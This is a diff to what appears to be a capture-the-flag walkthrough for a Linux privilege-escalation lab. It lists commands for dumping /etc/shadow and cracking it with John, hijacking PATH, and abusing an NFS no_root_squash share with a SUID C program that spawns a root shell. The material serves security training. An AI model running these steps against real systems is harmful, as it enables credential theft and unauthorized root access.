@@ -64,13 +64,14 @@ LFILE=/etc/shadow
 base64 "/etc/shadow" | base64 --decode 
 
 Copy the output to a txt file, along with the contents of /etc/passwd in another. Next, we must unshadow it.
-"unshadow [passwdfile.txt] [shadowfile.txt] > unshadowed.txt"
+unshadow [passwdfile.txt] [shadowfile.txt] > unshadowed.txt
 Now, run John against it
-"john unshadowed.txt"
+john [unshadowed.txt]
 
 Question 3: What is the content of the flag3.txt file?
-{LFILE=flag3.txt
-base64 "flag3.txt" | base64 --decode}
+{Hint}
+LFILE=flag3.txt
+base64 "flag3.txt" | base64 --decode
 
 
 
@@ -121,17 +122,58 @@ Task 10 {Privilege Escalation: PATH}
 
 Question 1: What is the odd folder you have write access for?
 {{Hint}}
-First, "find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u" to search for writable folders, and figure out which seems odd (home).
-Then, "find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u" to find the subfolder.
+First, search for writable folders, and figure out which seems odd (home): 
+find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+Then, find the subfolder for the answer:
+find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u
 
 
 Question 2: What is the content of the flag6.txt file?
 {{Hint}}
 
 Navigate to the /tmp/ folder and add it to the path: "export PATH=/tmp:$PATH"
-Create the executable: "echo /bin/bash > thm"
-"chmod 777 thm"
-Next, navigate to the odd folder in Question 1, and run the test script to get root: "./test"
+Create the executable: 
+echo /bin/bash > thm
+chmod 777 thm
+Then, navigate to the odd folder in Question 1, and run the test script to get root: 
+./test
+
+
+
+Task 11 {Privilege Escalation: NFS}
+
+Question 1:  How many mountable shares can you identify on the target system?
+{{Hint: On your machine, enumerate using: "showmount -e [victim IP]"}
+
+Question 2:  How many shares have the "no_root_squash" option enabled?
+{{Hint: After SSHing into the vulnerable machine, read the contents of /etc/exports with "cat /etc/exports"}}
+
+Question 3: What is the content of the flag7.txt file?
+{{Hint}}
+On your machine:
+sudo mkdir [foldername]
+mount -o rw [victim IP]:/home/ubuntu/sharedfolder pathtothe/folderyoumade
+cd into the folder
+
+Next, create the exploit:
+nano exploit.c
+
+int main()
+{  setgid(0);
+   setuid(0);
+   system("/bin/bash");
+   return 0;
+}
+
+Compile it and adjust permissions:
+gcc exploit.c -o exploit -w
+chmod +s exploit
+
+On the victim machine:
+cd /home/ubuntu/sharedfolder
+./exploit
+
+You should now be root. Head over to /home/matt/ for the flag.
 
 
 
